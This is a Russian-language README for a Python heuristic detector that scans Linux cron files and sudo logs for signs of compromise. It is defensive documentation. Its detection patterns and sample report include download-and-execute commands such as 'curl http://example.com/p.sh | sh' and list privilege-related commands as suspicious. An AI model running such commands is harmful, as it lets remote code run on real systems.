# ThreatDetector (cron + sudo)

Лёгкий детектор для Linux, который ищет:
- потенциальные инъекции в заданиях `cron`;
- подозрительные вызовы `sudo` по логам.

Сканеры запускаются по ключам или оба сразу по умолчанию.

## Возможности

### Cron‑сканер
- Проверяет:
  - `/etc/crontab`
  - `/etc/cron.d/*`
  - пользовательские crontab’ы: `/var/spool/cron`, `/var/spool/cron/crontabs`
  - скрипты: `/etc/cron.hourly`, `/etc/cron.daily`, `/etc/cron.weekly`, `/etc/cron.monthly`
- Ищет типичные индикаторы компрометации в командах.
- Сортирует находки по уровню критичности (`ВЫСОКИЙ/СРЕДНИЙ/НИЗКИЙ/ИНФО`).

### Sudo‑сканер
- Анализирует `/var/log/auth.log` или `/var/log/secure`.
- Проверяет `sudo.log`, если он настроен через `Defaults logfile=...` или есть `/var/log/sudo.log`.
- Ищет:
  - подозрительные команды (`curl|wget|bash|chmod +s|useradd|visudo|chown root`),
  - частые sudo‑вызовы за короткий период,
  - sudo без TTY,
  - запуск от нетипичных пользователей (сервисные аккаунты),
  - запуск из нетипичных мест (`/tmp`, `/dev/shm`, `/run`).

## Требования

- Linux.
- Python 3.8+.

## Установка

Зависимостей нет. Достаточно Python.

## Использование

Запустить оба сканера (по умолчанию):
```bash
python3 main.py
```

Только cron:
```bash
python3 main.py -c
```

Только sudo:
```bash
python3 main.py -s
```

Дополнительные пути/логи и вывод в файл:
```bash
python3 main.py --cron-paths /etc/cron.d /var/spool/cron   --sudo-logs /var/log/auth.log   --output /tmp/report.txt
```

## Формат отчёта

Отчёт разбит по секциям:
```
=== CRON ===
...

=== SUDO ===
...
```

Каждая находка включает:
- уровень критичности,
- источник и строку,
- причину,
- команду (если есть).


Пример вывода:
```
=== CRON ===
[ВЫСОКИЙ] /etc/cron.d/suspicious:3 скачивание и запуск (shell)
  паттерн: (curl|wget).*\|\s*(bash|sh|zsh|ksh)
  команда: * * * * * root curl http://example.com/p.sh | sh

=== SUDO ===
[СРЕДНИЙ] /var/log/auth.log:120 sudo без TTY (user=www-data)
  деталь: TTY отсутствует или неизвестен
  команда: /usr/bin/curl http://bad | sh
```

## Настройка sudo.log

Чтобы включить отдельный лог sudo, добавьте в `/etc/sudoers` или файл в `/etc/sudoers.d` строку:
```
Defaults logfile="/var/log/sudo.log"
```
После этого сканер автоматически проверит этот файл.

## Ограничения и ложные срабатывания

- Логи могут быть неполными/ротационными — часть событий может отсутствовать.
- Сервисные аккаунты могут легитимно выполнять `sudo` (например, при автоматизации) — это даст предупреждение.
- Некоторые легитимные команды (например, админские скрипты) могут совпасть с «подозрительными» паттернами.
- На системах без `auth.log`/`secure` сканер не найдёт событий (будет выведено INFO).

## Важно

Это эвристический детектор. Он помогает быстро сузить поиск, но:
- не гарантирует наличие вредоносных действий;
- не заменяет анализ журналов, контроль целостности и сетевой мониторинг.
